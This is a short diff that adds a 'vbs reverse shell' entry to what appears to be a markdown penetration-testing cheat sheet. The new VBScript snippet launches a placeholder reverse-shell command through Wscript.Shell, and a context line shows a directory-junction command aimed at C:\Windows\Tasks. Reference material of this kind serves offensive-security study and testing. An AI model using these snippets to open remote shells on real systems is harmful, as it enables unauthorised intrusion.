@@ -823,3 +823,14 @@ cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xa
 ```
 	
 </details>
+
+---
+<details>
+	<summary><strong>vbs reverse shell</strong></summary>
+
+```powershell
+Set cmdshell = CreateObject("Wscript.Shell")
+cmdshell.run "<reverse shell>"
+```
+	
+</details>
